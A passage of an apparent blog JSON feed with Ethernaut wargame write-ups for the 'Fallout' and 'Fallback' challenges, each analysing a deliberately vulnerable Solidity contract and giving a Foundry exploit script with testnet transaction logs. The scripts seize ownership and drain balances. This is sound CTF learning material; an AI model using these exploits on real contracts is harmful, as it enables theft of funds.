fallout_.Fal1out();        console.log(\"Contract owner: \", fallout_.owner());        vm.stopBroadcast();    }}$ forge script script/FalloutSol.sol --broadcast[‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.== Logs ==  Contract owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.002095526 gweiEstimated total gas used for script: 62992Estimated amount required: 0.000000132001373792 ETH==========================##### holesky‚úÖ  [Success] Hash: 0xcaa845bc5fa9ebb3adcb5902c12ffa24c14a609adc31cd0b789bfae23b11c5aaBlock: 3669787Paid: 0.000000095568239514 ETH (45606 gas * 0.002095519 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.000000095568239514 ETH (45606 gas * avg 0.002095519 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>Claim ownership of the contract below</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.6</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"openzeppelin-contracts-06/math/SafeMath.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Fallout</span> <span class=\"p\">{</span>    <span class=\"k\">using</span> <span class=\"n\">SafeMath</span> <span class=\"k\">for</span> <span class=\"kt\">uint256</span><span class=\"p\">;</span>    <span class=\"k\">mapping</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"o\">=&gt;</span> <span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"n\">allocations</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">payable</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"cm\">/* constructor */</span>    <span class=\"k\">function</span> <span class=\"n\">Fal1out</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"n\">allocations</span><span class=\"p\">[</span><span class=\"n\">owner</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">modifier</span> <span class=\"n\">onlyOwner</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span> <span class=\"o\">==</span> <span class=\"n\">owner</span><span class=\"p\">,</span> <span class=\"s\">\"caller is not the owner\"</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">allocate</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"n\">allocations</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">allocations</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">].</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">sendAllocation</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"k\">payable</span> <span class=\"n\">allocator</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">allocations</span><span class=\"p\">[</span><span class=\"n\">allocator</span><span class=\"p\">]</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span><span class=\"p\">);</span>        <span class=\"n\">allocator</span><span class=\"p\">.</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"n\">allocations</span><span class=\"p\">[</span><span class=\"n\">allocator</span><span class=\"p\">]);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">collectAllocations</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"n\">onlyOwner</span> <span class=\"p\">{</span>        <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">.</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">).</span><span class=\"nb\">balance</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">allocatorBalance</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">allocator</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">allocations</span><span class=\"p\">[</span><span class=\"n\">allocator</span><span class=\"p\">];</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p><a href=\"https://docs.soliditylang.org/en/v0.6.0/contracts.html#constructors\">Solidity 0.6.0 Documentation - constructors</a></p><aside>üí°Prior to version 0.4.22, constructors were defined as functions with the same name as the contract. This syntax was deprecated and is not allowed anymore in version 0.5.0.</aside><p>For some reason, the intended <code class=\"language-plaintext highlighter-rouge\">constructor</code> code was written as <code class=\"language-plaintext highlighter-rouge\">Fal1out()</code>, preventing it from acting as a <code class=\"language-plaintext highlighter-rouge\">constructor</code> and allowing external access, which enables claiming <code class=\"language-plaintext highlighter-rouge\">owner</code>.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.6</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Fallout.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">FallbackSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Fallout</span> <span class=\"k\">public</span> <span class=\"n\">fallout_</span> <span class=\"o\">=</span> <span class=\"n\">Fallout</span><span class=\"p\">(</span><span class=\"mh\">0x28eA66cBFb2900Bea8bb84f058d740ce0Ab751CB</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"n\">fallout_</span><span class=\"p\">.</span><span class=\"n\">Fal1out</span><span class=\"p\">();</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Contract owner: \"</span><span class=\"p\">,</span> <span class=\"n\">fallout_</span><span class=\"p\">.</span><span class=\"n\">owner</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/FalloutSol.sol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  Contract owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.002095526 gweiEstimated total gas used <span class=\"k\">for </span>script: 62992Estimated amount required: 0.000000132001373792 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0xcaa845bc5fa9ebb3adcb5902c12ffa24c14a609adc31cd0b789bfae23b11c5aaBlock: 3669787Paid: 0.000000095568239514 ETH <span class=\"o\">(</span>45606 gas <span class=\"k\">*</span> 0.002095519 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000095568239514 ETH (45606 gas * avg 0.002095519 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-17-Fallback/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/17/fallout",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-17T00:00:00+09:00",
            "date_modified": "2025-04-17T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/17/fallback",
            "title": "Fallback",
            "summary": null,
            "content_text": "AnalysisThe goals are  claim ownership of the contract  reduce its balance to 0// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Fallback {    mapping(address =&gt; uint256) public contributions;    address public owner;    constructor() {        owner = msg.sender;        contributions[msg.sender] = 1000 * (1 ether);    }    modifier onlyOwner() {        require(msg.sender == owner, \"caller is not the owner\");        _;    }    function contribute() public payable {        require(msg.value &lt; 0.001 ether);        contributions[msg.sender] += msg.value;        if (contributions[msg.sender] &gt; contributions[owner]) {            owner = msg.sender;        }    }    function getContribution() public view returns (uint256) {        return contributions[msg.sender];    }    function withdraw() public onlyOwner {        payable(owner).transfer(address(this).balance);    }    receive() external payable {        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);        owner = msg.sender;    }}To satisfy condition 2, go through the withdraw() function but access is impossible due to onlyOwner() modifier.However, looking receive() function, it seems that by increasingly the contribution value to more 0 through the contribute() function and sending more than 0 Ether to the contract, both conditions 1 and 2 could potentially be satisfied.Exploitsrc/Fallback.sol// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Fallback {    mapping(address =&gt; uint256) public contributions;    address public owner;    constructor() {        owner = msg.sender;        contributions[msg.sender] = 1000 * (1 ether);    }    modifier onlyOwner() {        require(msg.sender == owner, \"caller is not the owner\");        _;    }    function contribute() public payable {        require(msg.value &lt; 0.001 ether);        contributions[msg.sender] += msg.value;        if (contributions[msg.sender] &gt; contributions[owner]) {            owner = msg.sender;        }    }    function getContribution() public view returns (uint256) {        return contributions[msg.sender];    }    function withdraw() public onlyOwner {        payable(owner).transfer(address(this).balance);    }    receive() external payable {        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);        owner = msg.sender;    }}script/FallbackSol.sol// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/Fallback.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract FallbackSol is Script {    Fallback public fallback_ = Fallback(payable(0x0662008C4CEE1F808C3ca3800404a2BA704952eD));    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        fallback_.contribute{value: 1 wei}();        console.log(\"My contribution: \", fallback_.getContribution());        address(fallback_).call{value: 1 wei}(\"\");        console.log(\"Contract owner: \", fallback_.owner());        fallback_.withdraw();        vm.stopBroadcast();    }}$ forge script script/FallbackSol.sol --broadcast[‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.== Logs ==  My contribution:  1  Contract owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.001963943 gweiEstimated total gas used for script: 147280Estimated amount required: 0.00000028924952504 ETH==========================##### holesky‚úÖ  [Success] Hash: 0xcfd1b8b30ecdf9dffb0d024643f3417b6235cfb1b11a8fef17c101be63223026Block: 3661559Paid: 0.000000055583316672 ETH (28302 gas * 0.001963936 gwei)##### holesky‚úÖ  [Success] Hash: 0xa47df7ac8010f0c6e1762a3f9931ff817346eaa3a92564633f8ff9e082de85d0Block: 3661559Paid: 0.00000009420019024 ETH (47965 gas * 0.001963936 gwei)##### holesky‚úÖ  [Success] Hash: 0x5995b55be2748fafb828eb0b58ec7ffbd2f1a49b82b970413feeb294851dca6aBlock: 3661559Paid: 0.000000059632952704 ETH (30364 gas * 0.001963936 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.000000209416459616 ETH (106631 gas * avg 0.001963936 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goals are</p><ol>  <li>claim ownership of the contract</li>  <li>reduce its balance to 0</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Fallback</span> <span class=\"p\">{</span>    <span class=\"k\">mapping</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"o\">=&gt;</span> <span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">contributions</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"mi\">1000</span> <span class=\"o\">*</span> <span class=\"p\">(</span><span class=\"mi\">1</span> <span class=\"kc\">ether</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">modifier</span> <span class=\"n\">onlyOwner</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span> <span class=\"o\">==</span> <span class=\"n\">owner</span><span class=\"p\">,</span> <span class=\"s\">\"caller is not the owner\"</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">contribute</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span> <span class=\"o\">&lt;</span> <span class=\"mf\">0.001</span> <span class=\"kc\">ether</span><span class=\"p\">);</span>        <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">+=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">;</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">&gt;</span> <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">owner</span><span class=\"p\">])</span> <span class=\"p\">{</span>            <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">getContribution</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">];</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">withdraw</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"n\">onlyOwner</span> <span class=\"p\">{</span>        <span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"n\">owner</span><span class=\"p\">).</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">).</span><span class=\"nb\">balance</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">receive</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span><span class=\"p\">);</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>To satisfy condition 2, go through the <code class=\"language-plaintext highlighter-rouge\">withdraw()</code> function but access is impossible due to <code class=\"language-plaintext highlighter-rouge\">onlyOwner()</code> modifier.</p><p>However, looking <code class=\"language-plaintext highlighter-rouge\">receive()</code> function, it seems that by increasingly the <code class=\"language-plaintext highlighter-rouge\">contribution</code> value to more 0 through the <code class=\"language-plaintext highlighter-rouge\">contribute()</code> function and sending more than 0 Ether to the contract, both conditions 1 and 2 could potentially be satisfied.</p><h1 id=\"exploit\">Exploit</h1><hr /><p>src/Fallback.sol</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Fallback</span> <span class=\"p\">{</span>    <span class=\"k\">mapping</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"o\">=&gt;</span> <span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">contributions</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"mi\">1000</span> <span class=\"o\">*</span> <span class=\"p\">(</span><span class=\"mi\">1</span> <span class=\"kc\">ether</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">modifier</span> <span class=\"n\">onlyOwner</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span> <span class=\"o\">==</span> <span class=\"n\">owner</span><span class=\"p\">,</span> <span class=\"s\">\"caller is not the owner\"</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">contribute</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span> <span class=\"o\">&lt;</span> <span class=\"mf\">0.001</span> <span class=\"kc\">ether</span><span class=\"p\">);</span>        <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">+=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">;</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">&gt;</span> <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">owner</span><span class=\"p\">])</span> <span class=\"p\">{</span>            <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">getContribution</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">];</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">withdraw</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"n\">onlyOwner</span> <span class=\"p\">{</span>        <span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"n\">owner</span><span class=\"p\">).</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">).</span><span class=\"nb\">balance</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">receive</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span><span class=\"p\">);</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>script/FallbackSol.sol</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Fallback.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">FallbackSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Fallback</span> <span class=\"k\">public</span> <span class=\"n\">fallback_</span> <span class=\"o\">=</span> <span class=\"n\">Fallback</span><span class=\"p\">(</span><span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"mh\">0x0662008C4CEE1F808C3ca3800404a2BA704952eD</span><span class=\"p\">));</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"n\">fallback_</span><span class=\"p\">.</span><span class=\"n\">contribute</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"mi\">1</span> <span class=\"kc\">wei</span><span class=\"p\">}();</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"My contribution: \"</span><span class=\"p\">,</span> <span class=\"n\">fallback_</span><span class=\"p\">.</span><span class=\"n\">getContribution</span><span class=\"p\">());</span>        <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">fallback_</span><span class=\"p\">).</span><span class=\"nb\">call</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"mi\">1</span> <span class=\"kc\">wei</span><span class=\"p\">}(</span><span class=\"s\">\"\"</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Contract owner: \"</span><span class=\"p\">,</span> <span class=\"n\">fallback_</span><span class=\"p\">.</span><span class=\"n\">owner</span><span class=\"p\">());</span>        <span class=\"n\">fallback_</span><span class=\"p\">.</span><span class=\"n\">withdraw</span><span class=\"p\">();</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/FallbackSol.sol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  My contribution:  1  Contract owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.001963943 gweiEstimated total gas used <span class=\"k\">for </span>script: 147280Estimated amount required: 0.00000028924952504 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0xcfd1b8b30ecdf9dffb0d024643f3417b6235cfb1b11a8fef17c101be63223026Block: 3661559Paid: 0.000000055583316672 ETH <span class=\"o\">(</span>28302 gas <span class=\"k\">*</span> 0.001963936 gwei<span class=\"o\">)</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0xa47df7ac8010f0c6e1762a3f9931ff817346eaa3a92564633f8ff9e082de85d0Block: 3661559Paid: 0.00000009420019024 ETH <span class=\"o\">(</span>47965 gas <span class=\"k\">*</span> 0.001963936 gwei<span class=\"o\">)</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0x5995b55be2748fafb828eb0b58ec7ffbd2f1a49b82b970413feeb294851dca6aBlock: 3661559Paid: 0.000000059632952704 ETH <span class=\"o\">(</span>30364 gas <span class=\"k\">*</span> 0.001963936 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000209416459616 ETH (106631 gas * avg 0.001963936 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-17-Fallback/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/17/fallback",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-17T00:00:00+09:00",
            "date_modified": "2025-04-17T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/16/hello-ethernaut",
            "title": "Hello Ethernaut",
            "summary": null,
